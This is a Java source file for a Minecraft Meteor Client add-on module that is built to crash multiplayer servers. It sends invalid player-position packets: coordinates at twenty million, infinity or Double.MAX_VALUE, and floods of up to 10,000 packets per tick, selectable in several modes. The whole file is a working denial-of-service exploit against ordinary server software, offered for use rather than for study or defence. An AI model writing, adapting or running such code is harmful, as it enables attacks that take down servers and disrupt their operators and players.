/*
 *  Copyright (c) 2021 Wide_Cat and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */

package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.entity.player.PlayerMoveEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.mixininterface.IVec3d;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import widecat.meteorcrashaddon.CrashAddon;


public class InvalidPositionCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> packetMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("Which position crash to use.")
        .defaultValue(Modes.TWENTY_MILLION)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(500)
        .min(1)
        .sliderMin(1)
        .sliderMax(10000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public InvalidPositionCrash() {
        super(CrashAddon.CATEGORY, "invalid-position-crash", "Attempts to crash the server by sending invalid position packets. (may freeze or kick you)");
    }

    private boolean Switch = false;

    @Override
    public void onActivate() {
        if (Utils.canUpdate()) {
            switch (packetMode.get()) {
                /*
                Ported from Cornos to Crash Addon by Wide_Cat
                https://github.com/0x151/Cornos/blob/master/src/main/java/me/zeroX150/cornos/features/module/impl/exploit/crash/InvalidPositionCrash.java
                 */
                case TWENTY_MILLION -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(20_000_000, 255, 20_000_000, true));
                    toggle();
                }

                case INFINITY -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                    toggle();
                }

                case TP -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
            }
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        switch (packetMode.get()) {
            case TP -> {
                for (double i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * 9), mc.player.getZ(), true));
                }
                for (double i = 0; i < amount.get() * 10; i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * (double) amount.get()), mc.player.getZ() + (i * 9), true));
                }
            }
            case VELT -> {
                if (mc.player.age < 100) {
                    for (int i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ(), false));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), Double.MAX_VALUE, mc.player.getZ(), false));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ(), false));
                    }
                }
            }
        }
    }

    @EventHandler
    private void onMove(PlayerMoveEvent event) {
        if (Utils.canUpdate()) {
            switch (packetMode.get()) {
                case SWITCH -> {
                    if (Switch) {
                        ((IVec3d) event.movement).set(Double.MIN_VALUE, event.movement.getY(), Double.MIN_VALUE);
                        Switch = false;
                    }
                    else {
                        ((IVec3d) event.movement).set(Double.MAX_VALUE, event.movement.getY(), Double.MAX_VALUE);
                        Switch = true;
                    }
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        TWENTY_MILLION,
        INFINITY,
        TP,
        VELT,
        SWITCH
    }
}
